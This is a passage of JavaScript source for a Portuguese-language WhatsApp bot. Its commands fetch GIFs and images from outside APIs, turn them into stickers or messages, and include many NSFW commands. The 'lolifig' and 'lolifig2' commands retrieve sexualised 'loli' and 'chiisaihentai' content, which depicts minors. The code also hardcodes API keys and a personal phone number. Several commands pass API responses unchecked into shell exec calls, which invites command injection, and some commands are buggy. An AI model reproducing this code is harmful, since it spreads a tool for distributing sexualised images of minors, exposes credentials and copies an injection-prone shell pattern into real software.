					     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/wink?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
case 'apertar':
  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/glomp?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
case 'carinho':
  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/pat?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break

case 'sorrir':
  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random/smug?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
                    case 'baka':
                      addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
				    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random2/baka?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break 
					case 'kill':
					  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
				    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/kill?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
	            case 'nfig':
	               addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/ngif?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break 
					case 'food':
	               addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/feed?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break 
					case 'pussygif':
	               addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/solog?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break 
					case 'pegif':
	               addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/feetg?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break 
					case 'yurigif':
	               addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/les?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                    	exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    })
					break 
					
					case 'lick':
	               addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/kuni?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                    	exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    })
					break 
					
				case 'nekofig':
					  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/nsfw_neko_gif?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break
					case 'nekogif':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
await loli.sendMessage(from, { url: `http://api.lolhuman.xyz/api/random2/nsfw_neko_gif?apikey=ChOkYbOT8`}, MessageType.video, { mimetype: Mimetype.gif, caption: "teste!" })
break
                     case 'nekofig2':
                    addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buff, sticker, {quoted: horistk })
						fs.unlinkSync(rano)
					})
					break 
				case 'lolifig':
					  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random/nsfw/chiisaihentai?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break 
					case 'lolifig2':
					   addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buff, sticker, {quoted: horistk })
						fs.unlinkSync(rano)
					})
					break 
					case 'nhentai2':
				  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} 344253`)
                    henid = args[0]
					reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/nhentaipdfdownload?query=${henid}&apikey=Anakanjing123`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					bufferjj = await getBuffer(anu.result.pdf_file)
					loli.sendMessage(from, bufferjj, document, { quoted: say1, mimetype: Mimetype.pdf, filename: `@⭐Familia Henplay⭐-${pushname}.pdf` })
					break
					case 'pinterest':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
		            reply(mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=ChOkYbOT8&query=${query}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    loli.sendMessage(from, ini_buffer, image, { quoted: say1, thumbnail:null, caption: `*PINTEREST*\n\*Resultado da pesquisa👸✅* : *${query}*`})
                    break

case 'animefig':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(mess.wait)
const animeicon443= ["anime%20icon","icon%20anime","anime%20perfil","anime%20icon%20girl","anime%20aesthetic%20icon"]
animeicon44 = animeicon443[Math.floor(Math.random() * (animeicon443.length))]
ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=ChOkYbOT8&query=${animeicon44}`)
sendStickerFromUrl(from, ini_url.result)
break

case 'animegif':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(mess.wait)
const animegif234= ["gif%20icon%20anime","icon%20anime%20gif","anime%20gif","gif%20anime","anime%20gif%20icon"]
animegif23 = animegif234[Math.floor(Math.random() * (animegif234.length))]
ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=ChOkYbOT8&query=${animegif23}`)
sendStickerGIFFromUrl(from, ini_url.result)
break 

                    case 'pinterest2':      
  addFilter(from)
      if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
              if (args.length == 0) return reply(`Exemplo: ${prefix + command} anime icon`)
reply(mess.wait)
pin = await hx.pinterest(q)
ac = pin[Math.floor(Math.random() * pin.length)]
buffer = await getBuffer(ac)
await loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: `*PINTEREST*\n\*Resultado da pesquisa👸✅*`})
break
                    case '1tyr1indefinido':
                    addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    reply(mess.wait)
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} loli`)
                 	query = args.join(" ")
                  	data = await fetchJson(`https://api.vhtear.com/pinterest?query=${query}&apikey=Anakanjing123`, {method: 'get'})
                   	n = JSON.parse(JSON.stringify(data.result));
                  	nimek =  n[Math.floor(Math.random() * n.length)];
                  	pok = await getBuffer(nimek)
                 	loli.sendMessage(from, pok, image, { quoted: say1, thumbnail:null, caption: `*PINTEREST*\n\*Resultado da pesquisa👸✅* : *${query}*`})
                  	break
                  case 'nsfwboquete':
                   addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob}`, {method: 'get'})
					naru = JSON.parse(JSON.stringify(anu));
					to =  naru[Math.floor(Math.random() * naru.length)];
					nye = await getBuffer(to)
					loli.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: say1, thumbnail:null })
					  
					break
					case 'metadinha': 
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
			anu = await fetchJson(`https://api.lolhuman.xyz/api/random/ppcouple?apikey=ChOkYbOT8`) 
			cowo = await getBuffer(anu.result.male)
			loli.sendMessage(from, cowo, image, {quoted:say1, thumbnail:null, caption: '*Masculino*'})
       cewe = await getBuffer(anu.result.female)
		    pll = `*Feminino*`
   sendButImage(from, pll, `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`, cewe, [                      
          {
            buttonId: `${prefix}metadinha`,
            buttonText: {
              displayText: '➡️Avançar',
            },
            type: 1,
          },
        ]);                 
                    break
					case 'chorar':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random/cry?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break
case 'cringe':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/cringe?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break
case 'dançar':
case 'dance':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/dance?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break
                     case 'chorar2':
                     addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buff, sticker, {quoted: horistk })
						fs.unlinkSync(rano)
					})
					   
					break
					case 'nsfwblowjob':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
				    try {
						if (!isNsfw) return reply('❌ *FALSO* ❌')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob`, {method: 'get'})
						buffer = await getBuffer(res.result)
						loli.sendMessage(from, buffer, image, {quoted: say1, caption: 'Não faça ingredientes para o tio comum'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERRO* ❌')
					}
					break
					case 'ranime':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					gatauda = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=${TobzKey}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					loli.sendMessage(from, buffer, image, {quoted: say1})
					  
					break
					case 'bot':
                                        
					addFilter(from)
		          if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
 bufferv = fs.readFileSync('./src/horiintro.mp4')
					loli.sendMessage(from, bufferv, video, {mimetype: 'video/mp4', quoted: horivid })
			     	 
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS36iwRNhL2qLCtIOBi21Fy43c8Ek-apwGW9w&usqp=CAU`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: 'CRIADOR:*𝙯𝙖𝙙𝙞𝙠*\n\n*WPP:* wa.me/+5521971702453\n\nOi,sou a Hori é espero que você se divirta👸*'})
					break
					case 'trap2':
					 addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					    reply(mess.wait)
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
						buffer = await getBuffer(res.result)
						loli.sendMessage(from, buffer, image, {quoted: say1, caption: `trapzin para você onii-chan💜`})
						  
						break
						case 'cum':
                            addFilter(from)
                           if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                           if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                            reply(mess.wait)
                            hori = await getBuffer(`http://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss32 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss32, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
//_BUSCA IMAGEM NO PINTEREST		
case 'img': 
case 'image':
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
if (args.length < 1) return reply('Digite o comando juntamente com o que você deseja buscar')
loli.updatePresence(from, Presence.composing)
reply(ptbr.wait())
try {
data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${args}`, {method: 'get'})
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {quoted: say1, caption: `Achei isso sobre: ${args}`})
} catch {
reply(`Não econtrei nada sobre ${agrs}...`)
}
break

//_VOZ DO GOOGLE
case 'tts': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}tts (língua) (texto)\nExemplo: ${prefix}tts pt bom dia\n\nUse: ${prefix}ts para listar todas as línguas`, text, {quoted: say1})
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return loli.sendMessage(from, 'Cadê o texto?', text, {quoted: mek})
dtt = body.slice(8)
ranm = getRandom('.mp3')
dtt.length > 800
? reply('Texto muito grande')
: gtts.save(ranm, dtt, function() {
loli.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
fs.unlinkSync(ranm)
})
break

case 'patolino':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}patolino bom dia`, text, {quoted: say1})
reply(mess.wait)
query = args.join(" ")
lagu = await getBuffer(`http://brizas-api.herokuapp.com/imitar/patolino?apikey=BOT SOPHIA&text=${query}`)
loli.sendMessage(from, lagu, audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case 'faustao':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}faustao bom dia`, text, {quoted: say1})
reply(mess.wait)
query = args.join(" ")
lagu = await getBuffer(`http://brizas-api.herokuapp.com/imitar/faustao?apikey=BOT SOPHIA&text=${query}`)
loli.sendMessage(from, lagu, audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case 'eminem':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}eminem bom dia`, text, {quoted: say1})
reply(mess.wait)
query = args.join(" ")
lagu = await getBuffer(`http://brizas-api.herokuapp.com/imitar/eminem?apikey=BOT SOPHIA&text=${query}`)
loli.sendMessage(from, lagu, audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case 'ibere':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}ibere bom dia`, text, {quoted: say1})
reply(mess.wait)
query = args.join(" ")
lagu = await getBuffer(`http://brizas-api.herokuapp.com/imitar/ibere?apikey=BOT SOPHIA&text=${query}`)
loli.sendMessage(from, lagu, audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case 'seumadruga':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}seumadruga bom dia`, text, {quoted: say1})
reply(mess.wait)
query = args.join(" ")
lagu = await getBuffer(`http://brizas-api.herokuapp.com/imitar/seumadruga?apikey=BOT SOPHIA&text=${query}`)
loli.sendMessage(from, lagu, audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case 'ricksanchez':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return loli.sendMessage(from, `Você deve usar o comando da forma correta:\n${prefix}ricksanchez bom dia`, text, {quoted: say1})
reply(mess.wait)
query = args.join(" ")
